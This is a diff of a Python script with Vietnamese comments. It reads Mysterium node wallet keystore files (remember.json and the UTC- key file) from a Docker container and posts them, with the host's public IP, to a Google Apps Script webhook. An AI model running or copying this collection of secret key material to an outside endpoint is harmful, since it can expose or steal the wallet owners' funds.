@@ -2,65 +2,51 @@ import subprocess
 import json
 import requests
 
-def get_public_ipv4():
-    """ Lấy địa chỉ IPv4 chính xác """
+# ==== CẤU HÌNH URL GOOGLE APPS SCRIPT ====
+WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbwDvttxQWjeUuP4wmBRYwXMYr6jzNWT29E0oCsum_4GSuPt4VraDqQgZ2wD6LrojirdpQ/exec"  # Thay XXX bằng URL của bạn
+
+# ==== HÀM LẤY CHÍNH XÁC IP V4 ====
+def get_ipv4():
     try:
-        ip = requests.get("http://checkip.amazonaws.com", timeout=5).text.strip()
-        return ip
-    except:
-        try:
-            ip = requests.get("https://ifconfig.me", timeout=5).text.strip()
-            return ip
-        except:
-            return "Unknown"
+        ipv4 = subprocess.check_output("curl -s ifconfig.me", shell=True).decode().strip()
+        if not ipv4:
+            ipv4 = subprocess.check_output("curl -s https://checkip.amazonaws.com", shell=True).decode().strip()
+        return ipv4
+    except Exception as e:
+        print("Lỗi lấy IP:", e)
+        return None
 
-# Lấy địa chỉ IPv4
-ipv4 = get_public_ipv4()
+# ==== HÀM LẤY NỘI DUNG remember.json ====
+def get_wallet_data():
+    try:
+        result = subprocess.check_output("docker exec myst cat /var/lib/mysterium-node/keystore/remember.json", shell=True)
+        return result.decode().strip()  # Trả về toàn bộ JSON dưới dạng chuỗi
+    except Exception as e:
+        print("Lỗi lấy remember.json:", e)
+        return None
 
-# Lấy toàn bộ dữ liệu từ remember.json
-wallet_json = subprocess.run(
-    "docker exec myst cat /var/lib/mysterium-node/keystore/remember.json",
-    shell=True, capture_output=True, text=True
-).stdout.strip()
+# ==== HÀM LẤY NỘI DUNG FILE UTC- ====
+def get_phase_data():
+    try:
+        file_list = subprocess.check_output("docker exec myst ls /var/lib/mysterium-node/keystore | grep UTC-", shell=True)
+        file_name = file_list.decode().strip().split("\n")[0]  # Lấy file đầu tiên nếu có nhiều file
+        phase_data = subprocess.check_output(f"docker exec myst cat /var/lib/mysterium-node/keystore/{file_name}", shell=True)
+        return phase_data.decode().strip()  # Trả về toàn bộ nội dung file UTC-
+    except Exception as e:
+        print("Lỗi lấy file UTC-:", e)
+        return None
 
-# Kiểm tra nội dung wallet_json
-if not wallet_json:
-    print("LỖI: Dữ liệu remember.json trống!")
-    exit(1)  # Dừng chương trình nếu không có dữ liệu
+# ==== LẤY DỮ LIỆU & GỬI LÊN GOOGLE SHEETS ====
+ipv4 = get_ipv4()
+wallet_data = get_wallet_data()
+phase_data = get_phase_data()
 
-try:
-    wallet_data = json.loads(wallet_json)
-except json.JSONDecodeError:
-    print("LỖI: Không thể đọc JSON từ remember.json!")
-    print("Dữ liệu nhận được:", wallet_json)  # In nội dung để debug
-    exit(1)
-
-
-# Lấy tên file UTC-*
-utc_file = subprocess.run(
-    "docker exec myst ls /var/lib/mysterium-node/keystore | grep UTC-",
-    shell=True, capture_output=True, text=True
-).stdout.strip()
-
-# Lấy toàn bộ dữ liệu từ file UTC-*
-phase_json = subprocess.run(
-    f"docker exec myst cat /var/lib/mysterium-node/keystore/{utc_file}",
-    shell=True, capture_output=True, text=True
-).stdout.strip()
-
-try:
-    phase_data = json.loads(phase_json)  # Giữ nguyên toàn bộ nội dung
-except json.JSONDecodeError:
-    print("LỖI: Không thể đọc dữ liệu từ UTC file!")
-    phase_data = {}
-
-# Gửi toàn bộ dữ liệu lên Google Apps Script
-api_url = "https://script.google.com/macros/s/AKfycbxinRyh8Kl7q-SvhZYUoQLeh0-WU9gn5Mh3akiS2AQK3Wg1oN2XeZTMqJyGRPnMhL0v/exec"
 data = {
     "ipv4": ipv4,
-    "wallet_data": wallet_data,  # Gửi toàn bộ nội dung của remember.json
-    "phase_data": phase_data     # Gửi toàn bộ nội dung của UTC file
+    "wallet_data": wallet_data,
+    "phase_data": phase_data
 }
-response = requests.post(api_url, json=data)
 
-print(response.json())  # Kiểm tra phản hồi từ Apps Script
+response = requests.post(WEBHOOK_URL, json=data)
+
+print("Response:", response.text)
